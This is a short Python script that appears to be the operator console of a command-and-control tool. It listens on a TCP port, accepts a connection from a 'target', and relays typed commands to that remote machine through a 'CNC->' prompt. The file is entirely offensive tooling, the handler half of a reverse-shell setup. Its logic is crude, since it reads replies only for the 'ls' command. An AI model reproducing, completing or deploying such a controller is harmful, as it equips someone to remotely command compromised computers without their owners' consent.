import socket
import termcolor
import colorama
import sys


colorama.init()


def shell():
    while True:
        command = input("CNC->: ")
        if len(command) > 0:
            t.send(bytes(command.encode('utf-8')))
            if command == "kill":
                kill_server_and_all_cons()
            elif command[:2] == "cd":
                continue
            elif command == "ls":
                recv_from_target_and_print_result(socket_var=t)
                continue
            else:
                termcolor.cprint("")
                continue
        else:
            continue


def recv_from_target_and_print_result(socket_var):
    buf = socket_var.recv(1024)
    termcolor.cprint(buf)


def server():
    global s, t, t_ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 3737))
    s.listen(1)
    termcolor.cprint("Listening for incoming connections to the server...\n", 'blue')
    t, t_ip = s.accept()
    termcolor.cprint(f"Received connection from: {t_ip}\n", 'blue')
    shell()


def kill_server_and_all_cons():
    t.close()
    s.close()
    sys.exit(0)


server()
